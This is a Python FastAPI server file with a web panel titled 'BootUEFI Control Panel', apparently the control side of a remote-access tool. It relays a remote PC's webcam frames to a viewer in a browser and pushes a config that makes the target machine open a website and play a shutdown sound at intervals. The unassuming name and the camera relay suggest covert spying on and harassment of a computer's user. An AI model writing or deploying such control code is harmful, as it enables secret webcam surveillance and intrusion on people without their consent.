import json
import os
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# Путь к файлу конфига на VPS
CONFIG_FILE = "cfg.json"

# Хранилище последнего кадра в памяти для веб-страницы
latest_frame = None
latest_status = "камеры нет"

# Дефолтный конфиг
default_config = {
    "WebsiteNotifications": True,
    "WebsiteIntervalSeconds": 30,
    "WebsiteUrl": "https://vkvideo.ru",
    "AudioPlayer": True,
    "AudioIntervalSeconds": 10,
    "AudioUrl": "https://www.myinstants.com/media/sounds/windows-shutdown_lWRhnkD.mp3",
    "CameraEnabled": True,
    "CameraIntervalSeconds": 0.066  # ~15 кадров в секунду (1/15 = 0.066)
}


def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            pass
    return default_config


def save_config(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=4, ensure_ascii=False)


@app.get("/cfg.json")
def get_config():
    return JSONResponse(content=load_config())


@app.post("/update_config")
async def update_config(new_cfg: dict):
    save_config(new_cfg)
    return {"status": "success"}


# WebSocket для приема кадров от ПК
@app.websocket("/ws/camera")
async def camera_websocket(websocket: WebSocket):
    global latest_frame, latest_status
    await websocket.accept()
    try:
        while True:
            data = await websocket.receive()
            if "bytes" in data:
                latest_frame = data["bytes"]
                latest_status = "ok"
            elif "text" in data:
                latest_status = data["text"]
                latest_frame = None
    except WebSocketDisconnect:
        latest_status = "ПК отключился"


# WebSocket для отдачи кадров в браузер зрителя
@app.websocket("/ws/stream")
async def stream_websocket(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            if latest_frame:
                await websocket.send_bytes(latest_frame)
            else:
                await websocket.send_text(latest_status)
            import asyncio
            await asyncio.sleep(0.066)  # 15 FPS
    except WebSocketDisconnect:
        pass


# Главная веб-панель управления и просмотра
@app.get("/", response_class=HTMLResponse)
def index():
    return """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <title>BootUEFI Control Panel</title>
        <style>
            body { background: #121212; color: #00ffcc; font-family: monospace; padding: 20px; }
            .container { max-width: 800px; margin: auto; background: #1e1e1e; padding: 20px; border: 1px solid #00ffcc; box-shadow: 0 0 15px rgba(0,255,204,0.2); }
            img { width: 320px; height: 240px; border: 1px solid #00ffcc; background: #000; }
            textarea { width: 100%; height: 200px; background: #000; color: #00ffcc; border: 1px solid #00ffcc; padding: 10px; }
            button { background: #00ffcc; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
            button:hover { background: #00cca3; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🛡️ BootUEFI Control Panel</h2>
            <h3>Стрим с камеры (15 FPS)</h3>
            <div id="status" style="margin-bottom: 10px; color: yellow;">Подключение к потоку...</div>
            <img id="stream" alt="Ожидание потока камеры..." />

            <h3>Настройки конфига (cfg.json)</h3>
            <textarea id="configText"></textarea>
            <br>
            <button onclick="saveConfig()">Сохранить конфиг</button>
        </div>

        <script>
            // Получение конфига
            fetch('/cfg.json').then(r => r.json()).then(data => {
                document.getElementById('configText').value = JSON.stringify(data, null, 4);
            });

            function saveConfig() {
                try {
                    let jsonVal = JSON.parse(document.getElementById('configText').value);
                    fetch('/update_config', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(jsonVal)
                    }).then(r => alert('Конфиг обновлен!'));
                } catch(e) {
                    alert('Ошибка в JSON формате!');
                }
            }

            // Получение стрима по WebSocket
            const ws = new WebSocket(`ws://${location.host}/ws/stream`);
            ws.binaryType = "blob";
            const img = document.getElementById('stream');
            const statusDiv = document.getElementById('status');

            ws.onmessage = function(event) {
                if (typeof event.data === "string") {
                    statusDiv.innerText = "Статус: " + event.data;
                    img.style.display = "none";
                } else {
                    statusDiv.innerText = "Статус: Стрим активен";
                    img.style.display = "block";
                    img.src = URL.createObjectURL(event.data);
                }
            };
        </script>
    </body>
    </html>
    """
